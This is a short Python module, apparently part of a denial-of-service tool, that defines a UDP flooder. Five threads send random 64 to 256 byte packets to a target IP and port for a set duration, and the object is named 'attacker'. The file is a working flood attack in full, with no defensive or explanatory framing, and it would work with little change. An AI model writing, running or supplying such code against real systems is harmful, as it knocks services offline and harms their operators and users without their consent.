import socket
import threading
import os
import time
import random

class UDPPPS:
    def __init__(self, ip, port, duration, stop_event=None):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.running = False
        self.stop_event = stop_event

    def flood(self):
        self.running = True
        end_time = time.time() + self.duration
        threads = []
        for _ in range(5):  # Increase threads for more packets per second
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)
        try:
            while time.time() < end_time and self.running:
                if self.stop_event is not None and self.stop_event.is_set():
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False

    def send(self):
        while self.running:
            if self.stop_event is not None and self.stop_event.is_set():
                break
            try:
                packet_size = random.choice([64, 128, 256])
                data = os.urandom(packet_size)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (self.ip, self.port))
                s.close()
            except Exception:
                pass

def run(ip, port, time_sec, stop_event=None):
    attacker = UDPPPS(ip, port, duration=time_sec, stop_event=stop_event)
    attacker.flood()
